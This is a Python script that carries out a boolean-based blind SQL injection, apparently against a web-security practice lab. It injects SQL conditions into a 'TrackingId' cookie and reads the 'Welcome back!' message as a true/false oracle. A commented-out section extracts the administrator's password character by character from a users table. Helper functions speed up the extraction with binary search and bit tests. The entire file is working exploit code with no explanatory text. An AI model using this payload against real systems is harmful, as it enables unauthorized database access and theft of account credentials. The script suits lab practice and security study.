import requests,sys,json
from urllib.parse import quote_plus

def url(): 
    return sys.argv[1]

def target():
    session = requests.Session()
    session.get(url())
    return session.cookies.get_dict()["TrackingId"]

def oracle(q):
    payload = quote_plus(f"{target()}' AND ({q})--" )
    cookies = {
        "TrackingId": payload
    }
    response = requests.get(url(),cookies=cookies)
    return "Welcome back!" in response.text

#Calculate the Length
"""
length=0
while not oracle(f"(SELECT LENGTH(password) FROM users WHERE username = 'administrator') = {length}"):
    length += 1
print()

#Dumping the Characters
for i in range(1, length+1):
    for c in list(range(48,58)) + list(range(65,123)):
        if oracle(f"(SELECT ASCII(SUBSTRING(password,{i},1)) FROM users WHERE username = 'administrator') = {c}"):
            print(chr(c),end="")
            sys.stdout.flush()
            break
print()
"""

def dumpNumber(q):
    low = 0
    high = 127
    while low <= high:
        mid = (low+high) // 2
        if oracle(f"({q}) BETWEEN {low} AND {mid}"):
            high = mid -1
        else:
            low = mid + 1
    return low

def dumpString(q, length):
    val = ""
    for i in range(1, length+1):
        c = 0
        for p in range(7):
            if oracle(f"ASCII(SUBSTRING(({q}),{i},1))&{2**p}>0"):
                c |= 2**p
        val += chr(c)
    return val

